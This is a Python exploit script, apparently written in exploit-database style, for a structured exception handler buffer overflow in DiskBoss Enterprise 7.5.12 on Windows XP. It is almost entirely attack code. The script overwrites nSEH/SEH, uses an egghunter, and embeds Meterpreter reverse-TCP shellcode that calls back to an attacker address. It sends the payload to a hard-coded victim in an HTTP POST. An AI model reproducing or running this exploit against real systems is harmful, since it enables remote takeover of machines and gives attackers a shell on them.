# Exploit Title : DiskBoss Enterprise 7.5.12 Structured Exception Handler BOF
# Tested on : Windows XP Professional SP3 x86

import socket

victim = '192.168.219.161'
port = 80

# Bad Chars Identified \x00 \x09 \x0A \x0D \x20 

# JUMP SHORT 5
nSEH = '\x90\x90\xeb\x05'

# POP POP RETN
SEH = '\x1f\xfa\x03\x10'

egghunter = ""
egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x6e\x69\x6a\x6f\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# windows/meterpreter/reverse_ord_tcp LHOST=192.168.219.132 LPORT=443 EXITFUNC=thread
shellcode =  ""
shellcode += "\xbe\x30\xce\xc9\x21\xd9\xd0\xd9\x74\x24\xf4\x5f"
shellcode += "\x2b\xc9\xb1\x1f\x31\x77\x12\x03\x77\x12\x83\xf7"
shellcode += "\xca\x2b\xd4\x49\x05\x08\x6b\x8f\x71\x95\x4d\x9b"
shellcode += "\xa1\xde\x34\x48\x63\xaf\xd1\xbf\x01\xc3\xe2\xcd"
shellcode += "\xf6\x60\x26\xe2\xb8\xef\x61\xee\x65\xe6\xd1\xa1"
shellcode += "\xc8\x5a\xa8\x7e\xf1\x50\xb3\x50\x0b\xad\xa6\x96"
shellcode += "\x97\x5e\xe4\x13\x42\xb6\xc7\x21\xcf\x2d\x8e\x86"
shellcode += "\xe5\x63\xce\x88\x72\x7a\xd5\x32\x95\x07\x7d\x8c"
shellcode += "\x8f\x91\x27\xb7\x1e\x8a\xd8\x81\x07\x69\x68\xe9"
shellcode += "\x2f\x1c\xfb\xec\xd9\x1d\xe0\xd2\x2a\x87\x07\xe4"
shellcode += "\x35\x07\x28\xfe\x4a\x13\x9f\xaa\x28\xb6\x93\x83"
shellcode += "\x54\x7f\xa7\xce\xa1\xc7\x65\xac\x1c\x1d\xf5\xa5"
shellcode += "\xd5\xd6\x3f"

payload = 'njoffsec' * 311 + nSEH + SEH + '\x90\x90' + egghunter +'\x90\x90\x90\x90\x90' + 'nijonijo' + shellcode + '\x90\x90' + 'njnj' + 'njoffsec' * 538

buffer = ""
buffer += "POST " + payload + " HTTP/1.1\r\n"
buffer += "Host: 192.168.219.161\r\n"
buffer += "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer += "Accept-Language: en-US,en;q=0.5\r\n"
buffer += "Accept-Encoding: gzip, deflate\r\n"
buffer += "DNT: 1\r\n"
buffer += "Connection: close\r\n"
buffer += "Upgrade-Insecure-Requests: 1\r\n\r\n"
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((victim, port))
s.send(buffer)
s.close()
